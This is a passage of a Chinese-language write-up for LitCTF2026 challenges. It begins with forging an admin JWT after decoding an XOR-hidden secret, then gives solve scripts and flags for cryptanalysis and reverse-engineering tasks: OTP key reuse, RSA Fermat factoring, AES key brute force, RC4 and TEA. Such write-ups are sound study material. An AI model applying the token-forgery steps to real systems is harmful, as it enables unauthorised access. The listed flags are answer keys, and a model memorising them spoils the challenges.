+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">28 17 2d 05 68 6a 68 6c 05 36 33 2e 39 2e 3c 05</span><br><span class="line">30 2d 2e 05 29 3f 39 28 3f 2e 05 31 3f 23 7b 7b</span><br></pre></td></tr></table></figure>
+
+<p>把它按字节拿出来以后，最先应该做的不是上复杂算法，而是先试最常见的轻量混淆：</p>
+<ul>
+<li>单字节异或</li>
+<li>加减偏移</li>
+<li>倒序</li>
+<li>Base64 &#x2F; Hex 编码误导</li>
+</ul>
+<p>把每个字节都异或 <code>0x5a</code>，得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rMw_2026_litctf_jwt_secret_key!!</span><br></pre></td></tr></table></figure>
+
+<p>解密钥脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;28172d05686a686c0536332e392e3c05302d2e05293f39283f2e05313f237b7b&quot;</span>)</span><br><span class="line">key = <span class="built_in">bytes</span>(b ^ <span class="number">0x5a</span> <span class="keyword">for</span> b <span class="keyword">in</span> enc)</span><br><span class="line"><span class="built_in">print</span>(key.decode()</span><br></pre></td></tr></table></figure>
+
+<p>OK，拿到密钥了就可以伪造jwt了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523174755946.png" alt="image-20260523174755946"></p>
+<p>把role改成admin生成新的token。</p>
+<p>改cookie里的token拿到flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523174910983.png" alt="image-20260523174910983"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;crordl3y-ydyw-4ux-8gdx-zfuodqtk0fjqz&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LitCTF2026-lit-xor-two-story"><a href="#LitCTF2026-lit-xor-two-story" class="headerlink" title="[LitCTF2026] lit_xor_two_story"></a>[LitCTF2026] lit_xor_two_story</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某同学用 同一串随机密钥流 k 对两条长度均为 40 字节的明文做异或「流密码」加密，却忘记了一次一密的基本要求：密钥绝不能复用。</span><br></pre></td></tr></table></figure>
+
+<p>OTP密钥重用</p>
+<p>当两条明文 M1 和 M2 使用相同的密钥流 K 加密时，密文分别为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523151915934.png" alt="image-20260523151915934"></p>
+<p>如果我们计算两个密文的异或，密钥流 $K$ 会被抵消：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523151946549.png" alt="image-20260523151946549"></p>
+<p>已知其中一条明文 $M_2$，我们可以直接还原出 $M_1$：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523152024446.png" alt="image-20260523152024446"></p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c1 = bytes.fromhex(&quot;5f70a847ce12759e156e3cad1aa9530a119386a02ffc1c31bf14ab7a0a82ccc108f8476f75c98a28&quot;)</span><br><span class="line">c2 = bytes.fromhex(&quot;5f70a847ce123cc153283ca710ae7f042b8490a238eb2228970fad6a2694f2985dc5557e69e5f474&quot;)</span><br><span class="line">m2 = b&quot;litctf2026_xor_keystream_reuse_40bytes!!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1_xor_m2 = bytes(a ^ b for a, b in zip(c1, c2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1 = bytes(a ^ b for a, b in zip(m1_xor_m2, m2))</span><br><span class="line"></span><br><span class="line">print(f&quot;Flag: &#123;m1.decode()&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523152051005.png" alt="image-20260523152051005"></p>
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">litctf&#123;otp_reuse_never_twice_same_key__&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-elgamal-handshake"><a href="#LitCTF2026-lit-elgamal-handshake" class="headerlink" title="[LitCTF2026] lit_elgamal_handshake"></a>[LitCTF2026] lit_elgamal_handshake</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务端打印了 ElGamal 私钥 x，这是一次典型的「调试产物泄露」。</span><br></pre></td></tr></table></figure>
+
+<p>ElGamal 解密原理:<br><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/Screenshot%202026-05-25%20135831.png"><br>然后用私钥解密即可。</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = 9000784855376359808051354825193962042770028561343848432778443672755982397391267124312572697249531643069409873722736348916207732622884411596948807031140651</span><br><span class="line">c1 = 5245857426274383693193378669425243235151460522527004924092730024427525619244222247576829782077334810173274945751493387545849499010408499951268967774043627</span><br><span class="line">c2 = 6059939492718262451327758167005534191200936922719178843825888167191062504030471358635203794720371216217447404436172970111033824674731063386612549785069654</span><br><span class="line">x = 633366293219022684108628483753423657477324253833657141033762971761747669344649667887002347907882241246119223126492863291886751205505360049793728851371884</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = pow(c1, x, p)</span><br><span class="line"></span><br><span class="line">m = (c2 * pow(s, -1, p)) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag.decode())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523152509462.png" alt="image-20260523152509462"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">litctf&#123;elgamal_leak_makes_happy_decrypt&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-rsa-neighbor"><a href="#LitCTF2026-lit-rsa-neighbor" class="headerlink" title="[LitCTF2026] lit_rsa_neighbor"></a>[LitCTF2026] lit_rsa_neighbor</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密钥生成脚本选了一个随机素数 p，然后对 p 连续调用多次「下一个素数」，得到 q，再令 (n=pq)。直觉上 (p) 与 (q) 仍然相差不大——这会让 费马分解 在普通笔记本上也可行。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/Screenshot%202026-05-25%20140012.png"></p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">n = 139637440016232025690294457609899605991056011052010466558411851317943636600860419882966079629826706361935550982744312593243181819999590825159611186779613601241742349986440676188542381451066058816661317621009248513651083772907520139375108426466691332559612971244160246310746215067136490772061317571744230078911</span><br><span class="line">c = 81172369642931859390486697024961350889751244109623802937988620847486863147682579984823958801948701482096140632580173113959531836503723522945335985723867818778699337807630592078265626995722998378992215523352858561923474395550395284015986525513984910021995657780411466237306614109262460764382539311725297619429</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = gmpy2.isqrt(n) + 1</span><br><span class="line">while True:</span><br><span class="line">    y2 = x*x - n</span><br><span class="line">    y = gmpy2.isqrt(y2)</span><br><span class="line">    if y*y == y2:</span><br><span class="line">        p = x - y</span><br><span class="line">        q = x + y</span><br><span class="line">        break</span><br><span class="line">    x += 1</span><br><span class="line"></span><br><span class="line">print(f&quot;分解成功: \np = &#123;p&#125;\nq = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = pow(e, -1, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line">print(f&quot;Flag: &#123;long_to_bytes(m).decode()&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523152915550.png" alt="image-20260523152915550"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">litctf&#123;rsa_fermat_finds_close_primes&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-tiny-key-aes"><a href="#LitCTF2026-lit-tiny-key-aes" class="headerlink" title="[LitCTF2026] lit_tiny_key_aes"></a>[LitCTF2026] lit_tiny_key_aes</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运维政策规定 AES-128-ECB 密钥的前 13 个字节固定为可读前缀 LitCTF2026!!!，只有末尾 3 个字节由终端随机生成。密钥空间过小，不适合对抗离线枚举。</span><br></pre></td></tr></table></figure>
+
+<p>题目提供了一段 Python 加密脚本和一段 AES-128-ECB 模式加密的密文。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KEY_PREFIX = b&quot;LitCTF2026!!!&quot;  # 13 bytes</span><br><span class="line">key = KEY_PREFIX + UNKNOWN_KEY_SUFFIX  # 16 bytes</span><br></pre></td></tr></table></figure>
+
+<p>AES-128 的密钥长度为 16 字节。由于前 13 个字节被硬编码固定，真正的未知变量 <code>UNKNOWN_KEY_SUFFIX</code> 只有 3 个字节。</p>
+<p>不多说了暴力破解吧。</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">c = b&quot;\x0c\xdb&#x27;`\xc91\xf7\x05\x91+\x0fM\xed\xbc\x9b\xf1\xd8D\xcd\xfd\x0c\xb9\xb6\xb2J&lt;\x86\x19\x06K\xb3\xa2\xa4\x18\x87&lt;v\xac\x1bbu#\xaa\xb5I\x7f\xd8\xd3&quot;</span><br><span class="line">KEY_PREFIX = b&quot;LitCTF2026!!!&quot;</span><br><span class="line">for i in range(16777216):</span><br><span class="line"> </span><br><span class="line">    key = KEY_PREFIX + i.to_bytes(3, &#x27;big&#x27;)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">   </span><br><span class="line">    pt = cipher.decrypt(c)</span><br><span class="line">    </span><br><span class="line">    if b&quot;litctf&quot; in pt.lower():</span><br><span class="line">       </span><br><span class="line">        pad_len = pt[-1]</span><br><span class="line">        if 1 &lt;= pad_len &lt;= 16 and pt[-pad_len:] == bytes([pad_len]) * pad_len:</span><br><span class="line">            clean_pt = pt[:-pad_len]</span><br><span class="line">        else:</span><br><span class="line">            clean_pt = pt</span><br><span class="line">            </span><br><span class="line">        print(f&quot;\n[+] 爆破成功&quot;)</span><br><span class="line">        print(f&quot;[+] 密钥 (Hex): &#123;key.hex()&#125;&quot;)</span><br><span class="line">        print(f&quot;[+] Flag: &#123;clean_pt.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    if i % 2000000 == 0 and i &gt; 0:</span><br><span class="line">        print(f&quot;[*] 进度: 已检查 &#123;i&#125; 个密钥...&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523153407736.png" alt="image-20260523153407736"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">litctf&#123;aes_tiny_brut3_for_the_win!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="LitCTF2026-lit-rc4-variant"><a href="#LitCTF2026-lit-rc4-variant" class="headerlink" title="[LitCTF2026] lit_rc4_variant"></a>[LitCTF2026] lit_rc4_variant</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序实现一种 64 字节状态 的流密码式异或：初始化与 RC4 类似但模 64，且输出字节与 S[v7] + S[v10]（模 256）异或——与「标准 RC4 输出 S[(S[i]+S[j])&amp;255]」不同。密钥为 ASCII 字符串，放在 .rdata。</span><br></pre></td></tr></table></figure>
+
+<p>拖进IDA：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523153918915-1779521960301-1.png" alt="image-20260523153918915"></p>
+<p>前几个都是比较关键的字符串。</p>
+<p>先看main函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155842877.png" alt="image-20260523155842877"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523155855601.png" alt="image-20260523155855601"></p>
+<p>输入长度29</p>
+<p>密钥就是这个：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523160039729.png" alt="image-20260523160039729"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523160149567.png" alt="image-20260523160149567"></p>
+<p>就是之前字符串里的：{&#x3D;8wNrB}E7v</p>
+<p>加密逻辑是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keystream = (S[(S[i] + old_Si) &amp; 0x3f] + S[i]) &amp; 0xff</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>状态数组长度是 <code>64</code>，所以所有下标都按 <code>0x3f</code> 取模</li>
+<li><code>old_Si</code> 指的是交换前保存下来的 <code>S[i]</code></li>
+<li>最后再和明文或密文做逐字节异或</li>
+</ul>
+<p>解密脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">key = b&quot;lit_rc4_key!&quot;</span><br><span class="line">cipher = bytes([</span><br><span class="line">    0x7b, 0x3d, 0x38, 0x77, 0x4e, 0x72, 0x42, 0x7d, 0x45, 0x37,</span><br><span class="line">    0x76, 0x0f, 0x53, 0x53, 0x4f, 0x66, 0x37, 0x17, 0x75, 0x37,</span><br><span class="line">    0x5f, 0x49, 0x58, 0x72, 0x74, 0x7f, 0x79, 0x1f, 0x3a</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">def crypt(data: bytes) -&gt; bytes:</span><br><span class="line">    S = list(range(64))</span><br><span class="line">    K = [key[i % len(key)] for i in range(64)]</span><br><span class="line"></span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(64):</span><br><span class="line">        j = (j + S[i] + K[i]) % 64</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    out = bytearray(data)</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line">    for pos in range(len(out)):</span><br><span class="line">        i = (i + 1) % 64</span><br><span class="line">        old_si = S[i]</span><br><span class="line">        j = (j + old_si) % 64</span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        ks = (S[(S[i] + old_si) &amp; 0x3f] + S[i]) &amp; 0xff</span><br><span class="line">        out[pos] ^= ks</span><br><span class="line">    return bytes(out)</span><br><span class="line"></span><br><span class="line">plain = crypt(cipher)</span><br><span class="line">print(plain)</span><br><span class="line">print(crypt(plain) == cipher)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523160404169.png" alt="image-20260523160404169"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;rev05_rc4_variant_64!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-tea-standard"><a href="#LitCTF2026-lit-tea-standard" class="headerlink" title="[LitCTF2026] lit_tea_standard"></a>[LitCTF2026] lit_tea_standard</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序把你输入的 flag 做 PKCS#7 填充 到 8 字节倍数，再按 8 字节一块 做 标准 TEA（32 轮，delta = 0x9E3779B9），与内存中的密文逐字节比较。密钥 k[0..3] 以 4×uint32 形式存放在 .rdata。</span><br></pre></td></tr></table></figure>
+
+<p>经典tea</p>
+<p>字符串没啥重要的直接看main函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523161217858.png" alt="image-20260523161217858"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523161229176.png" alt="image-20260523161229176"></p>
+<p><code>v6 = v5 &amp; 7</code> 是求 <code>len mod 8</code>，<code>v7 = v5 + 8 - v6</code> 是把长度补到下一个 8 的倍数Buf1[v5++] &#x3D; 8 - v6是把 pad 值连续写到末尾。同时要求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v7 != 32 )</span><br><span class="line">  goto LABEL_13;</span><br></pre></td></tr></table></figure>
+
+<p>32 字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v8 = Buf1;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *(_DWORD *)v8;</span><br><span class="line">    v10 = *((_DWORD *)v8 + 1);</span><br><span class="line">    for ( i = 0; i != -957401312; v10 += (i + v9) ^ ((v9 &gt;&gt; 5) - 559038737) ^ (16 * v9 - 889275714) )</span><br><span class="line">    &#123;</span><br><span class="line">      i -= 1640531527;</span><br><span class="line">      v9 += (i + v10) ^ ((v10 &gt;&gt; 5) - 1341448704) ^ (16 * v10 - 1591939156);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)v8 = v9;</span><br><span class="line">    *((_DWORD *)v8 + 1) = v10;</span><br><span class="line">    v8 += 8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 != &amp;v13 );</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>每次从 <code>v8</code> 取两个 <code>DWORD</code></p>
+</li>
+<li><p>每轮先更新 <code>v9</code>，再更新 <code>v10</code></p>
+</li>
+<li><p>两个更新式都长成：<br><code>((x &lt;&lt; 4) +/- K1) ^ (x + sum) ^ ((x &gt;&gt; 5) +/- K2)</code></p>
+</li>
+<li><p><code>i</code> 每轮变化一次，最后比较终止值</p>
+<p>标准的32轮tea。</p>
+<p>在 32 位无符号整数里：</p>
+<p>x - C &#x3D; x + (2^32 - C)</p>
+<p>所以可以直接把这些减法常量还原回真正的 TEA key：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">k0 = 0x100000000 - 0x5EE31054 = 0xA11CEFAC</span><br><span class="line">k1 = 0x100000000 - 0x4FF4E200 = 0xB00B1E00</span><br><span class="line">k2 = 0x100000000 - 0x35014542 = 0xCAFEBABE</span><br><span class="line">k3 = 0x100000000 - 0x21524111 = 0xDEADBEEF</span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">k0 = 0xA11CEFAC</span><br><span class="line">k1 = 0xB00B1E00</span><br><span class="line">k2 = 0xCAFEBABE</span><br><span class="line">k3 = 0xDEADBEEF</span><br></pre></td></tr></table></figure>
+
+<p>后面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  if ( !memcmp_0(Buf1, &amp;g_cipher, 0x20u) )</span><br><span class="line">    &#123;</span><br><span class="line">      puts_0(&quot;Good!&quot;);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      puts_0(&quot;Wrong!&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523163418904.png" alt="image-20260523163418904"></p>
+<p>读取这些字节：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ed ef 21 fe b7 9b 3c b0</span><br><span class="line">1e 93 72 e2 02 3e 29 bc</span><br><span class="line">36 f7 0c 92 2e 5a ae 46</span><br><span class="line">44 fa 45 25 1a e5 8c 87</span><br></pre></td></tr></table></figure>
+
+<p>这就是最终拿来比较的目标密文。</p>
+<p>接下来只需要写一个标准 TEA 解密脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from struct import unpack, pack</span><br><span class="line"></span><br><span class="line">cipher = bytes.fromhex(</span><br><span class="line">    &quot;ed ef 21 fe b7 9b 3c b0&quot;</span><br><span class="line">    &quot; 1e 93 72 e2 02 3e 29 bc&quot;</span><br><span class="line">    &quot; 36 f7 0c 92 2e 5a ae 46&quot;</span><br><span class="line">    &quot; 44 fa 45 25 1a e5 8c 87&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">k = [0xA11CEFAC, 0xB00B1E00, 0xCAFEBABE, 0xDEADBEEF]</span><br><span class="line">DELTA = 0x9E3779B9</span><br><span class="line">MASK = 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">def tea_decrypt_block(block):</span><br><span class="line">    v0, v1 = unpack(&quot;&lt;2I&quot;, block)</span><br><span class="line">    total = (DELTA * 32) &amp; MASK</span><br><span class="line">    for _ in range(32):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; 4) + k[2]) ^ (v0 + total) ^ ((v0 &gt;&gt; 5) + k[3]))) &amp; MASK</span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; 4) + k[0]) ^ (v1 + total) ^ ((v1 &gt;&gt; 5) + k[1]))) &amp; MASK</span><br><span class="line">        total = (total - DELTA) &amp; MASK</span><br><span class="line">    return pack(&quot;&lt;2I&quot;, v0, v1)</span><br><span class="line"></span><br><span class="line">plain = b&quot;&quot;.join(tea_decrypt_block(cipher[i:i + 8]) for i in range(0, len(cipher), 8))</span><br><span class="line">print(plain)</span><br><span class="line">print(plain[:-plain[-1]])</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523163532949.png" alt="image-20260523163532949"></p>
+</li>
+</ol>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;rev03_tea_standard!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-b64-alphabet"><a href="#LitCTF2026-lit-b64-alphabet" class="headerlink" title="[LitCTF2026] lit_b64_alphabet"></a>[LitCTF2026] lit_b64_alphabet</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序把你输入的 flag 按标准 Base64 的分组方式编码，但 64 个输出字符的字母表 不是 RFC 默认顺序，而是程序里保存的一串置换。比对对象是内存中的 期望密文字符串。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523163748495.png" alt="image-20260523163748495"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 